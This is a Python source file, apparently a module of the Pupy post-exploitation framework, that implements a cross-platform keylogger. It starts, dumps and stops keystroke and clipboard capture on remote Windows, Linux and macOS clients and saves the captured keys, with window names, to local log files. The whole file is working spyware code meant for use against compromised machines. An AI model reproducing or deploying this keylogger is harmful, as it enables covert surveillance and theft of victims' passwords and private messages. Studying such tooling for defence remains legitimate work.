# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import StringIO
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
import os
import datetime
import codecs

__class_name__="KeyloggerModule"

@config(cat="gather", compat=["linux", "darwin", "windows"])
class KeyloggerModule(PupyModule):
    """
        A keylogger to monitor all keyboards interaction including the clipboard :-)
        The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
    """

    unique_instance = True
    dependencies = {
        'windows': [ 'pupwinutils.keylogger' ],
        'linux': [ 'keylogger' ],
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='keylogger', description=cls.__doc__)
        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def stop_daemon(self):
        self.success("keylogger stopped")

    def run(self, args):
        if args.action=="start":
            if self.client.is_windows():
                if not self.client.conn.modules["pupwinutils.keylogger"].keylogger_start():
                    self.error("the keylogger is already started")
                else:
                    self.success("keylogger started !")

            elif self.client.is_linux():
                r = self.client.conn.modules["keylogger"].keylogger_start()
                if r == 'no_x11':
                    self.error("the keylogger does not work without x11 graphical interface")
                elif not r:
                    self.error("the keylogger is already started")
                else:
                    self.success("keylogger started !")

            # for Mac OS
            elif self.client.is_darwin():
                r = self.client.conn.modules["keylogger"].keylogger_start()
                if r == 'running':
                    self.error("the keylogger is already started")
                elif not r:
                    self.error("the keylogger cannot be launched")
                else:
                    self.success("keylogger started !")

        elif args.action=="dump":
            try:
                os.makedirs(os.path.join("data","keystrokes"))
            except Exception:
                pass

            if self.client.is_windows():
                data = self.client.conn.modules["pupwinutils.keylogger"].keylogger_dump()
            elif self.client.is_linux():
                 data = self.client.conn.modules["keylogger"].keylogger_dump()
            elif self.client.is_darwin():
                data = self.client.conn.modules["keylogger"].keylogger_dump()

            if data is None:
                self.error("keylogger not started")

            elif not data:
                self.warning("no keystrokes recorded")

            else:
                filepath = os.path.join(
                    'data', 'keystrokes',
                    'keys_'+self.client.short_name()+'_'+
                    str(datetime.datetime.now()).replace(' ','_').replace(':','-')+'.log'
                )

                self.success("dumping recorded keystrokes in %s"%filepath)
                self.log(data)

                with codecs.open(filepath, 'w', encoding='utf-8') as f:
                    f.write(data.decode('utf8', errors='replace'))

        elif args.action=="stop":
            if self.client.is_windows():
                data = self.client.conn.modules["pupwinutils.keylogger"].keylogger_stop()
            elif self.client.is_linux():
                data = self.client.conn.modules["keylogger"].keylogger_stop()
            elif self.client.is_darwin():
                data = self.client.conn.modules["keylogger"].keylogger_stop()

            if data:
                self.log(data)

            self.success("keylogger stopped")
